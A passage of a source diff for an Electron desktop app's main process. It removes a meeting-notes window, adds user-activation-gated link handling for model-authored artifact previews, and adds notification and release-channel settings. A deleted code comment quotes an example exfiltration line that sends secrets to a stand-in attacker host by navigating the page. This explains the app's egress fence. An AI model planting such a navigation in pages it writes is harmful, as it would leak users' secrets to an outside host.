-  const navigation: DesktopDeepLinkNavigation = { url: target, entrypoint: 'in_app_link' };
-  const raise = (window: BrowserWindow): void => {
-    if (window.isMinimized()) window.restore();
-    window.show();
-    window.focus();
-  };
-  if (!mainWindow || mainWindow.isDestroyed() || !rendererReady) {
-    if (!pendingDeepLinks.some((pending) => pending.url === target)) pendingDeepLinks.push(navigation);
-    // Gone: a new window opens on the queued link and raises itself. Present but
-    // still loading — a reload, a slow cold start — is the case that would
-    // otherwise queue the link and raise nothing at all.
-    if (!mainWindow || mainWindow.isDestroyed()) {
-      if (app.isReady()) void createMainWindow();
-    } else {
-      raise(mainWindow);
-    }
-    return;
-  }
-  mainWindow.webContents.send('auth:deep-link', navigation);
-  raise(mainWindow);
+  revealWindow(targetWindow);
 }
 
 function emitDeepLink(rawUrl: string, entrypoint: DesktopDeepLinkEntrypoint = 'deep_link'): boolean {
@@ -2880,6 +2852,51 @@ function artifactServingDomain(): string {
   return process.env.VITE_ARTIFACT_SERVING_DOMAIN?.trim() || 'rallyusercontent.com';
 }
 
+/**
+ * How one artifact surface is allowed to leave its origin.
+ *
+ * The activation state is built here rather than in the policy module because
+ * it is reconstructed from Electron's own `input-event` stream: the main
+ * process is told nothing about user activation when a navigation starts, so
+ * the presses that reach these contents are the only evidence there is. One
+ * tracker per surface — the rail preview and a pop-out show different
+ * documents, and a shared flag would let a click in one send the other away.
+ */
+function artifactLinkHandoff(contents: WebContents): ArtifactLinkHandoff {
+  const activation = new ArtifactUserActivation();
+  contents.on('input-event', (_event, input) => activation.record(input.type));
+  // A committed main-frame navigation ends the document the press belonged to.
+  // `did-navigate` is the right event and `did-navigate-in-page` deliberately is
+  // not: a fragment jump leaves the same document on screen, and a browser does
+  // not drop activation for one either.
+  contents.on('did-navigate', () => activation.reset());
+  return {
+    takeActivation: () => activation.take(),
+    // The same scheme policy every other handoff in this process uses: http(s)
+    // only, and https only once packaged.
+    externalAllowed: isAllowedExternalUrl,
+    // Caught rather than discarded: the OS opener rejects when it cannot launch
+    // the URL — no registered default browser, a handler that refuses — and an
+    // unhandled rejection takes the main process down, since this process only
+    // *monitors* uncaught exceptions. Failing to follow a link must cost a log
+    // line, not the window somebody was reading.
+    openExternal: (url) => {
+      void shell.openExternal(url).catch((error: unknown) => {
+        logWarn('rally', 'could not open an artifact link in the browser', error);
+      });
+    },
+    // Through the same loader the initial presentation uses, so a page that
+    // redeems or redirects on arrival is not mistaken for a failed load. The URL
+    // is never logged: it is model-authored and may carry whatever the page put
+    // in it.
+    navigateInPlace: (url) => {
+      void loadArtifactInitialUrl(() => contents.loadURL(url)).then((loaded) => {
+        if (!loaded) logWarn('rally', 'could not follow a link inside a site preview');
+      });
+    },
+  };
+}
+
 function artifactPreviewFor(window: BrowserWindow): ArtifactPreviewController {
   const existing = artifactPreviews.get(window);
   if (existing) return existing;
@@ -2905,7 +2922,7 @@ function artifactPreviewFor(window: BrowserWindow): ArtifactPreviewController {
       // is the only part of a torn-down surface that can be asked anything.
       const contents = view.webContents;
       artifactWebContents.add(contents);
-      confineToArtifactOrigin(contents, new URL(request.url).origin);
+      confineToArtifactOrigin(contents, new URL(request.url).origin, artifactLinkHandoff(contents));
       window.contentView.addChildView(view);
       const handle: ArtifactViewHandle = {
         destroyed: () => contents.isDestroyed(),
@@ -2954,7 +2971,7 @@ function openArtifactWindow(request: { artifactId: string; url: string; title: s
     webPreferences: artifactWebPreferences(request.artifactId, app.isPackaged),
   });
   artifactWebContents.add(window.webContents);
-  confineToArtifactOrigin(window.webContents, new URL(request.url).origin);
+  confineToArtifactOrigin(window.webContents, new URL(request.url).origin, artifactLinkHandoff(window.webContents));
   // The artifact controls document.title, but this strip belongs to Rally's
   // window. Keep the bounded resource title instead of letting remote markup
   // rename the native chrome after it loads.
@@ -3006,17 +3023,9 @@ function assertTrustedIpcSender(event: IpcMainInvokeEvent): void {
   const belongsToRallyWindow = sender === mainWindow?.webContents
     || sender === settingsWindow?.webContents
     || sender === sidekicksWindow?.webContents
-    || sender === deepLinkErrorWindow?.webContents
-    || isMeetingWindowContents(sender);
+    || sender === deepLinkErrorWindow?.webContents;
   if (!belongsToRallyWindow || !event.senderFrame || !rendererNavigationAllowed(event.senderFrame.url)) {
     throw new Error('Blocked IPC request from untrusted content');
-  }
-}
-
-function assertMeetingIpcSender(event: IpcMainInvokeEvent): void {
-  assertTrustedIpcSender(event);
-  if (!isMeetingWindowContents(event.sender)) {
-    throw new Error('Only a meeting-notes window can request recording permissions');
   }
 }
 
@@ -3041,13 +3050,6 @@ function assertMainWindowIpcSender(event: IpcMainInvokeEvent): void {
   }
 }
 
-function meetingAudioPermissionDependencies() {
-  return {
-    askForMicrophoneAccess: () => systemPreferences.askForMediaAccess('microphone'),
-    getMicrophoneAccessStatus: () => systemPreferences.getMediaAccessStatus('microphone'),
-  };
-}
-
 function registerIpc(): void {
   registerRealtimeSocketIpc({
     apiBaseUrls: Object.values(runtimeConfig().api),
@@ -3067,6 +3069,16 @@ function registerIpc(): void {
   ipcMain.handle('application:foreground-get', (event) => {
     assertTrustedIpcSender(event);
     return applicationForegrounded ?? BrowserWindow.getFocusedWindow() !== null;
+  });
+  ipcMain.handle('application-settings:set-push-notifications', async (event, enabled: unknown) => {
+    assertTrustedIpcSender(event);
+    if (typeof enabled !== 'boolean') throw new Error('Invalid notification preference');
+    await desktopPush.set(enabled);
+    return desktopApplicationSettings();
+  });
+  ipcMain.handle('application-settings:open-notifications', async (event) => {
+    assertTrustedIpcSender(event);
+    await shell.openExternal('x-apple.systempreferences:com.apple.Notifications-Settings.extension');
   });
   ipcMain.handle('application-settings:get', async (event) => {
     assertTrustedIpcSender(event);
@@ -3124,6 +3136,17 @@ function registerIpc(): void {
     assertTrustedIpcSender(event);
     await productAnalyticsSettingsController.set(rawEnabled);
     return desktopApplicationSettings();
+  });
+  ipcMain.handle('application-settings:set-release-channel', async (event, rawChannel: unknown) => {
+    assertTrustedIpcSender(event);
+    const channel = parseDesktopReleaseChannel(rawChannel);
+    if (!channel) throw new Error('Invalid desktop release channel');
+    await updateStoredApplicationSettings(userDataDirectory(), { releaseChannel: channel });
+    desktopReleaseChannel = channel;
+    autoUpdateController?.setReleaseChannel(channel);
+    const settings = desktopApplicationSettings();
+    broadcastApplicationSettingsChanged(settings);
+    return settings;
   });
   ipcMain.handle('telemetry:screen', async (event, rawScreen: unknown) => {
     assertTrustedIpcSender(event);
@@ -3229,7 +3252,7 @@ function registerIpc(): void {
   ipcMain.handle('onboarding:get-account', async (event) => {
     assertTrustedIpcSender(event);
     const { response } = await onboardingIdentityRequest((credential) => net.fetch(
-      `${runtimeConfig().api.global}/onboarding/account`,
+      `${configuredApiBase('global')}/onboarding/account`,
       { headers: { Authorization: `Bearer ${credential.accessToken}` } },
     ));
     if (!response.ok) throw await responseError(response);
@@ -3239,7 +3262,7 @@ function registerIpc(): void {
     assertTrustedIpcSender(event);
     const input = UpdateAccountOnboardingSchema.parse(raw);
     const { response } = await onboardingIdentityRequest((credential) => net.fetch(
-      `${runtimeConfig().api.global}/onboarding/account`,
+      `${configuredApiBase('global')}/onboarding/account`,
       { method: 'PATCH', headers: { Authorization: `Bearer ${credential.accessToken}`, 'Content-Type': 'application/json' }, body: JSON.stringify(input) },
     ));
     if (!response.ok) throw await responseError(response);
@@ -3302,6 +3325,19 @@ function registerIpc(): void {
       throw new Error('Invalid clipboard text');
     }
     clipboard.writeText(text);
+  });
+  ipcMain.handle('system:show-definition', (event) => {
+    assertTrustedIpcSender(event);
+    showDefinitionForSelection(process.platform, event.sender);
+  });
+  ipcMain.handle('system:share-text', (event, text: unknown) => {
+    assertTrustedIpcSender(event);
+    shareText(process.platform, text, {
+      popupShare: (sharingItem, window) => {
+        new ShareMenu(sharingItem).popup(window ? { window } : undefined);
+      },
+      window: BrowserWindow.fromWebContents(event.sender),
+    });
   });
   ipcMain.handle('window:set-conversation-details', (event, rawInput: unknown) => {
     assertMainWindowIpcSender(event);
@@ -3442,73 +3478,13 @@ function registerIpc(): void {
     if (deepLinkErrorNotice?.id !== rawNoticeId) return;
     deepLinkErrorWindow?.close();
   });
-  ipcMain.handle('system:open-meeting-notes', async (event, rawNoteId: unknown) => {
-    assertTrustedIpcSender(event);
-    if (rawNoteId !== undefined && (typeof rawNoteId !== 'string' || !isUuid(rawNoteId))) {
-      throw new Error('Invalid note ID');
-    }
-    await createMeetingWindow(rawNoteId as string | undefined, rawNoteId === undefined ? 'sidebar' : 'unknown');
-  });
-  ipcMain.handle('meeting-audio:get-permissions', (event) => {
-    assertMeetingIpcSender(event);
-    return meetingAudioPermissions(meetingAudioPermissionDependencies());
-  });
-  ipcMain.handle('meeting:set-recording-state', (event, input: unknown) => {
-    assertMeetingIpcSender(event);
-    if (!input || typeof input !== 'object') throw new Error('Invalid meeting recording state');
-    const candidate = input as Record<string, unknown>;
-    const workspaceId = IdSchema.safeParse(candidate['workspaceId']);
-    const region = RegionSchema.safeParse(candidate['region']);
-    if (
-      !workspaceId.success
-      || !region.success
-      || typeof candidate['recording'] !== 'boolean'
-      || Object.keys(candidate).some((key) => !['workspaceId', 'region', 'recording'].includes(key))
-    ) throw new Error('Invalid meeting recording state');
-    if (candidate['recording'] && (
-      inMemorySession?.workspace?.id !== workspaceId.data
-      || inMemorySession.workspace.region !== region.data
-    )) {
-      throw new Error('The meeting no longer belongs to the active workspace');
-    }
-    workspaceChangeGuard.recordingChanged(
-      event.sender.id,
-      desktopWorkspaceIdentityKey(region.data, workspaceId.data),
-      candidate['recording'],
-    );
-  });
-  ipcMain.handle('meeting-audio:prepare-permissions', (event) => {
-    assertMeetingIpcSender(event);
-    return prepareMeetingAudioPermissions(meetingAudioPermissionDependencies());
-  });
-  ipcMain.handle('meeting-audio:start-system-capture', (event) => {
-    assertMeetingIpcSender(event);
+  ipcMain.handle('transcription-audio:start-system-capture', (event) => {
+    assertMainWindowIpcSender(event);
     return nativeSystemAudioController.start(event.sender);
   });
-  ipcMain.handle('meeting-audio:stop-system-capture', (event) => {
-    assertMeetingIpcSender(event);
+  ipcMain.handle('transcription-audio:stop-system-capture', (event) => {
+    assertMainWindowIpcSender(event);
     return nativeSystemAudioController.stop(event.sender);
-  });
-  ipcMain.handle('meeting-audio:open-settings', async (event, rawPermission: unknown) => {
-    assertMeetingIpcSender(event);
-    if (rawPermission !== 'microphone' && rawPermission !== 'system-audio') {
-      throw new Error('Invalid meeting audio permission');
-    }
-    const url = meetingAudioSettingsUrl(rawPermission as MeetingAudioPermissionKind, process.platform);
-    if (!url) throw new Error('Open this platform’s privacy settings to change recording access.');
-    await shell.openExternal(url);
-  });
-  ipcMain.handle('system:close-meeting-notes', (event, rawNoteId: unknown) => {
-    assertTrustedIpcSender(event);
-    if (rawNoteId !== undefined && (typeof rawNoteId !== 'string' || !isUuid(rawNoteId))) {
-      throw new Error('Invalid note ID');
-    }
-    const meetingWindow = [...meetingWindows].find((window) => window.webContents === event.sender);
-    if (!meetingWindow) throw new Error('Only a meeting-notes window can close itself');
-    // Raise the note before the window goes, so the person is handed to it
-    // rather than left looking at whatever the meeting window was covering.
-    if (typeof rawNoteId === 'string') revealNoteInMainWindow(rawNoteId);
-    forceCloseMeetingWindow(meetingWindow);
   });
 }
 
@@ -3532,12 +3508,11 @@ function hardenWebContents(contents: WebContents): void {
   });
 
   const preventUntrustedNavigation = (event: Electron.Event, url: string): void => {
-    // Artifact surfaces are refused, never handed off. Opening a URL an
-    // artifact composed would make Rally perform the exfiltration the egress
-    // fence exists to prevent: `location = "https://attacker/?" + secrets` is a
-    // navigation, which no CSP directive governs. `confineToArtifactOrigin`
-    // owns what these contents may do; the global listener must return before
-    // preventing anything on those contents.
+    // Artifact surfaces are never decided here. What a model-authored page may
+    // do with a URL turns on transient user activation, which this broad fence
+    // knows nothing about, and on the artifact's own origin, which it does not
+    // hold: `confineToArtifactOrigin` owns both. The global listener must
+    // return before preventing anything on those contents.
     applyGlobalNavigationPolicy({
       event,
       url,
@@ -3897,7 +3872,7 @@ function preloadPath(): string {
 
 function installWindowDiagnostics(
   window: BrowserWindow,
-  surface: 'main' | 'settings' | 'sidekicks' | 'meeting' | 'deep-link-error',
+  surface: 'main' | 'settings' | 'sidekicks' | 'deep-link-error',
 ): void {
   window.webContents.on('preload-error', (_event, _scriptPath, error) => {
     logError('rally', `${surface} preload failed to initialize`, {
@@ -3958,7 +3933,7 @@ function installWindowDiagnostics(
 async function loadRenderer(
   window: BrowserWindow,
   url: string,
-  surface: 'main' | 'settings' | 'sidekicks' | 'meeting' | 'deep-link-error',
+  surface: 'main' | 'settings' | 'sidekicks' | 'deep-link-error',
 ): Promise<void> {
   try {
     await window.loadURL(url);
@@ -3970,10 +3945,8 @@ async function loadRenderer(
 }
 
 function rendererUrl(
-  surface?: 'settings' | 'sidekicks' | 'meeting' | 'deep-link-error',
+  surface?: 'settings' | 'sidekicks' | 'deep-link-error',
   settingsSection?: DesktopSettingsSection,
-  noteId?: string,
-  meetingEntrypoint?: 'sidebar' | 'menu_bar' | 'unknown',
 ): string {
   const target = rendererDevelopmentUrl
     ? new URL(rendererDevelopmentUrl)
@@ -3983,11 +3956,7 @@ function rendererUrl(
   if (surface === 'settings') target.hash = '/settings';
   if (surface === 'sidekicks') target.hash = '/sidekicks';
   if (surface === 'deep-link-error') target.hash = '/deep-link-error';
-  if (surface === 'meeting') {
-    if (noteId) target.searchParams.set('noteId', noteId);
-    if (meetingEntrypoint) target.searchParams.set('meetingEntrypoint', meetingEntrypoint);
-    target.hash = '/meeting';
-  }
+
   return target.toString();
 }
 
@@ -4237,74 +4206,6 @@ async function createSidekicksWindow(requestedTarget?: SidekicksWindowTarget): P
   await loadRenderer(sidekicksWindow, target.toString(), 'sidekicks');
 }
 
-async function createMeetingWindow(
-  requestedNoteId?: string,
-  entrypoint: 'sidebar' | 'menu_bar' | 'unknown' = 'unknown',
-): Promise<void> {
-  const noteId = requestedNoteId ?? crypto.randomUUID();
-  const meetingWindow = new BrowserWindow({
-    width: 720,
-    height: 860,
-    minWidth: 540,
-    minHeight: 640,
-    show: false,
-    backgroundColor: windowBackgroundColor(),
-    title: 'Meeting notes — Rally',
-    titleBarStyle: process.platform === 'darwin' ? 'hiddenInset' : 'default',
-    trafficLightPosition: { x: 18, y: 17 },
-    ...(process.platform === 'darwin' ? {} : { icon: applicationWindowIconPath() }),
-    webPreferences: {
-      preload: preloadPath(),
-      contextIsolation: true,
-      devTools: !app.isPackaged,
-      nodeIntegration: false,
-      sandbox: true,
-      spellcheck: true,
-      webSecurity: true,
-      allowRunningInsecureContent: false,
-    },
-  });
-  // BrowserWindow.webContents throws after Electron emits `closed`. Retain the
-  // WebContents object while the window is alive so native audio cleanup can
-  // still identify its owner during teardown.
-  const meetingContents = meetingWindow.webContents;
-  meetingWindows.add(meetingWindow);
-  installWindowDiagnostics(meetingWindow, 'meeting');
-  meetingWindow.setMenuBarVisibility(false);
-  meetingWindow.once('ready-to-show', () => meetingWindow.show());
-  meetingWindow.on('close', (event) => {
-    if (meetingWindowsAllowedToClose.has(meetingWindow)) return;
-    event.preventDefault();
-    // The screen finalizes the recording and closes the window itself. It may
-    // also stop and ask first, but only for a close the person performed on
-    // this window: during a quit, a window that waits for an answer is a
-    // window that never shuts, and the quit dies with it.
-    meetingContents.send('meeting:close-requested', quitting ? 'quit' : 'user');
-  });
-  meetingWindow.on('closed', () => {
-    void nativeSystemAudioController.stop(meetingContents).catch((error) => {
-      logWarn('meeting', 'Failed to stop native computer audio after window close', error);
-    });
-    meetingWindows.delete(meetingWindow);
-    workspaceChangeGuard.windowClosed(meetingContents.id);
-    // A meeting window is the only thing that vetoes a quit, so while one is
-    // still open the quit it abandoned is still the close every other meeting
-    // window is answering. Once the last has gone, Rally is staying up, and
-    // the next close is the person's again.
-    if (meetingWindows.size === 0) quitting = false;
-  });
-  try {
-    await loadRenderer(
-      meetingWindow,
-      rendererUrl('meeting', undefined, noteId, requestedNoteId === undefined ? entrypoint : undefined),
-      'meeting',
-    );
-  } catch (error) {
-    forceCloseMeetingWindow(meetingWindow);
-    throw error;
-  }
-}
-
 function installApplicationMenu(): void {
   const template = applicationMenuTemplate({
     appName: app.name,
@@ -4329,13 +4230,16 @@ function installApplicationMenu(): void {
 }
 
 async function createMainWindow(): Promise<void> {
+  // Electron's ready event precedes our async startup. Native notification and
+  // URL callbacks can arrive before the renderer protocol and IPC exist.
+  await mainWindowStartup;
+  if (mainWindowLoading) return mainWindowLoading;
   if (mainWindow && !mainWindow.isDestroyed()) {
-    if (mainWindow.isMinimized()) mainWindow.restore();
-    mainWindow.show();
-    mainWindow.focus();
+    revealWindow(mainWindow);
     return;
   }
   rendererReady = false;
+  mainWindowReadyToShow = false;
   mainWindow = new BrowserWindow({
     width: 1180,
     height: 940,
@@ -4361,10 +4265,15 @@ async function createMainWindow(): Promise<void> {
   const mainWindowWebContentsId = mainWindow.webContents.id;
 
   installWindowDiagnostics(mainWindow, 'main');
-  mainWindow.webContents.on('render-process-gone', () => {
+  mainWindow.webContents.on('render-process-gone', (_event, details) => {
     realtimeSocketBroker.closeOwner(mainWindowWebContentsId);
+    rendererReady = false;
+    void rendererCrashRecovery.offer(details.reason);
   });
-  mainWindow.once('ready-to-show', () => mainWindow?.show());
+  mainWindow.once('ready-to-show', () => {
+    mainWindowReadyToShow = true;
+    mainWindow?.show();
+  });
   mainWindow.webContents.on('did-start-navigation', (_event, _url, isInPlace, isMainFrame) => {
     // Hash-router transitions are same-document navigations. Treating them as
     // a renderer restart strands later OAuth/invitation callbacks in the main
@@ -4391,7 +4300,12 @@ async function createMainWindow(): Promise<void> {
     settingsWindowController.releasePrewarmed();
   });
 
-  await loadRenderer(mainWindow, rendererUrl(), 'main');
+  mainWindowLoading = loadRenderer(mainWindow, rendererUrl(), 'main');
+  try {
+    await mainWindowLoading;
+  } finally {
+    mainWindowLoading = null;
+  }
 }
 
 function installContentSecurityPolicy(): void {
@@ -4431,7 +4345,7 @@ function installContentSecurityPolicy(): void {
   electronSession.defaultSession.setPermissionRequestHandler((webContents, permission, callback, details) => {
     const trustedRenderer = rendererNavigationAllowed(details.requestingUrl);
     callback(allowsTrustedAudioCapture({
-      isAudioCaptureWindow: webContents === mainWindow?.webContents || isMeetingWindowContents(webContents),
+      isAudioCaptureWindow: webContents === mainWindow?.webContents,
       mediaTypes: 'mediaTypes' in details ? details.mediaTypes ?? [] : [],
       permission,
       trustedRenderer,
@@ -4440,7 +4354,7 @@ function installContentSecurityPolicy(): void {
   electronSession.defaultSession.setPermissionCheckHandler((webContents, permission, requestingOrigin, details) => {
     const trustedRenderer = rendererNavigationAllowed(requestingOrigin);
     return allowsTrustedAudioCapture({
-      isAudioCaptureWindow: webContents === mainWindow?.webContents || isMeetingWindowContents(webContents),
+      isAudioCaptureWindow: webContents === mainWindow?.webContents,
       mediaTypes: details.mediaType ? [details.mediaType] : [],
       permission,
       trustedRenderer,
@@ -4461,10 +4375,17 @@ if (!singleInstanceLock) {
     }
     else if (mainWindow) {
       applicationOpenObserver.opened('user_launch');
-      if (mainWindow.isMinimized()) mainWindow.restore();
-      mainWindow.show();
-      mainWindow.focus();
+      revealWindow(mainWindow);
     }
+  });
+
+  app.on('continue-activity', (event, type, _userInfo, details) => {
+    if (type !== 'NSUserActivityTypeBrowsingWeb' || !details.webpageURL) return;
+    const link = workstreamHttpsDeepLink(details.webpageURL);
+    if (!link) return;
+    event.preventDefault();
+    observeAcceptedDeepLinkOpen();
+    sendDeepLink(link, 'deep_link');
   });
 
   app.on('open-url', (event, url) => {
@@ -4515,13 +4436,17 @@ if (!singleInstanceLock) {
     try {
       // Before any window is constructed, so the first one of the launch opens
       // on the theme's own canvas rather than flashing the previous default.
-      windowThemeChoice = (await readStoredApplicationSettings(userDataDirectory())).themeChoice;
+      // The updater also needs its local channel before its first request.
+      const applicationSettings = await readStoredApplicationSettings(userDataDirectory());
+      windowThemeChoice = applicationSettings.themeChoice;
+      desktopReleaseChannel = applicationSettings.releaseChannel;
     } catch (error) {
       logWarn('rally', 'could not read the stored window theme', error);
     }
     // Complete the one-time full-session to split-state migration before any
     // renderer window can issue concurrent session requests.
     const launchAuth = await loadStoredAuth();
+    await desktopPush.initialize();
     try {
       // The durable device choice admits early events to the local spool. A
       // cold regional preference read is reconciliation, not a launch
@@ -4563,12 +4488,14 @@ if (!singleInstanceLock) {
     protocol.handle(fontScheme, (request) => themeFontCache.respond(request.url));
     installContentSecurityPolicy();
     registerIpc();
+    resolveMainWindowStartup();
     autoUpdateController = initializeAutoUpdate({
       isPackaged: app.isPackaged,
       platform: process.platform,
       arch: process.arch,
       env: process.env,
       currentVersion: app.getVersion(),
+      releaseChannel: desktopReleaseChannel,
       showMessageBox: (options) => dialog.showMessageBox(options),
       openExternal: (url) => shell.openExternal(url),
       beforeInstall: prepareForUpdateInstall,
@@ -4604,6 +4531,7 @@ if (!singleInstanceLock) {
     const launchEntrypoint = initialApplicationOpenEntrypoint({
       openedAtLogin,
       hasDeepLink: initialDeepLink !== undefined || prelaunchDeepLinkObserved,
+      hasPushNotification: prelaunchPushObserved,
     });
     applicationOpenObserver.launched(launchEntrypoint);
     applicationLaunchObserved = true;
@@ -4636,6 +4564,8 @@ if (!singleInstanceLock) {
 
     if (initialDeepLink) emitDeepLink(initialDeepLink);
 
+    app.on('browser-window-focus', () => desktopPush.refreshPermission());
+
     app.on('activate', () => {
       applicationOpenObserver.activated();
       if (!mainWindow || mainWindow.isDestroyed()) {
@@ -4650,7 +4580,7 @@ if (!singleInstanceLock) {
   });
 }
 
-process.on('uncaughtExceptionMonitor', (error, origin) => {
+function reportMainProcessFatal(error: Error, origin: MainProcessFatalOrigin): void {
   const frames = safeJavascriptFrames(error.stack);
   if (frames.length === 0) {
     void telemetryReporter?.processHealth(
@@ -4665,6 +4595,20 @@ process.on('uncaughtExceptionMonitor', (error, origin) => {
     errorCode: javascriptErrorCode(error, origin === 'unhandledRejection' ? 'unhandled_rejection' : 'unknown'),
     frames,
   }).catch(() => undefined);
+}
+
+installMainProcessNetworkRecovery(process, {
+  recovered: (error, code) => {
+    // Preserve the payload-free fleet signal this rejection emitted before
+    // it became recoverable; a packaged app's local warning is not observable.
+    void telemetryReporter?.processHealth('main', 'rejection', 'unknown').catch(() => undefined);
+    logWarn('rally', 'recovered a transient main-process network reset', { code, error });
+  },
+  reportFatal: reportMainProcessFatal,
+  // Throw only after Node has delivered every rejection already pending in
+  // this microtask batch. The fatal monitor consumes the marker above so the
+  // scheduled throw is not double-counted as an ordinary exception.
+  deferFatal: (fatal) => { setImmediate(fatal); },
 });
 
 app.on('browser-window-focus', () => {
@@ -4687,19 +4631,8 @@ app.on('window-all-closed', () => {
   if (process.platform !== 'darwin') app.quit();
 });
 
-// A quit asks every window to close, and this is what tells a meeting window
-// that the close it is answering is a quit rather than the person closing that
-// window — the difference between finalizing and asking first.
-//
-// The flag says "a quit was requested and has not finished", not "a quit was
-// requested this tick", because the cascade is not reliably synchronous: on
-// macOS a window mid-fullscreen-transition defers its close until the
-// transition ends, and a close arriving after a timed reset would be read as
-// the person's and answered with a dialog — vetoing the quit silently, which is
-// the one outcome this flag exists to rule out. It is cleared where the quit is
-// known to be over instead, as the last meeting window goes.
 app.on('before-quit', (event) => {
-  quitting = true;
+  applicationIsQuitting = true;
   if (telemetryQuitBarrier.hold(() => app.quit())) event.preventDefault();
 });
 
